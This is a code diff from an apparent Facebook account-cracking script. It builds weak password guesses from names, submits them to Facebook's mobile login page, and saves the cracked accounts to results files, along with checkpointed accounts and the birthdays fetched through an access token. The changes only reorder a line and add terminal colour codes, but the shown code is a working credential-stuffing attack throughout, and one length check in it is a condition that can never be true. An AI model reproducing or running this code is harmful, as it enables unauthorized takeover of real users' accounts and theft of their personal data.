@@ -839,10 +839,10 @@ def crack_random():
 				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
 					pwx.append(ss+"123")
 					pwx.append(ss+"12345")
+					pwx.append(ss)
 				else:
 					pwx.append(ss+"123")
 					pwx.append(ss+"12345")
-					pwx.append(ss)
 		try:
 			for pw in pwx:
 				pw = pw.lower()
@@ -923,10 +923,10 @@ def manual():
 				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua_mb})
 				xo = rex.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print('\r ID: ' +uid+ '|' + asu + '       ')
+					print('\r \x1b[1;93mID: ' +uid+ '|' + asu + '       ')
 					ok.append(uid+'|'+asu)
 					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write(' ID: '+str(uid)+'|'+str(asu)+'\n')
+					save.write(' \x1b[1;93mID: '+str(uid)+'|'+str(asu)+'\n')
 					save.close()
 					break
 					continue
@@ -936,19 +936,19 @@ def manual():
 						url = ("https://graph.facebook.com/"+uid+"?access_token="+__cindy__)
 						data = s.get(url).json()
 						ttl = data['birthday'].replace("/","-")
-						print('\r ID: ' +uid+ '|' + asu + '|' + ttl)
+						print('\r \x1b[1;93mID: ' +uid+ '|' + asu + '|' + ttl)
 						cp.append(uid+'|'+asu+'|'+ttl)
 						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-						save.write(' ID: '+str(uid)+'|'+str(asu)+'|'+ttl+'\n')
+						save.write(' \x1b[1;93mID: '+str(uid)+'|'+str(asu)+'|'+ttl+'\n')
 						save.close()
 						break
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print('\r ID: ' +uid+ '|' + asu + '       ')
+					print('\r \x1b[1;93mID: ' +uid+ '|' + asu + '       ')
 					cp.append(uid+'|'+asu)
 					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write(' ID: '+str(uid)+'|'+str(asu)+'\n')
+					save.write(' \x1b[1;93mID: '+str(uid)+'|'+str(asu)+'\n')
 					save.close()
 					break
 					continue
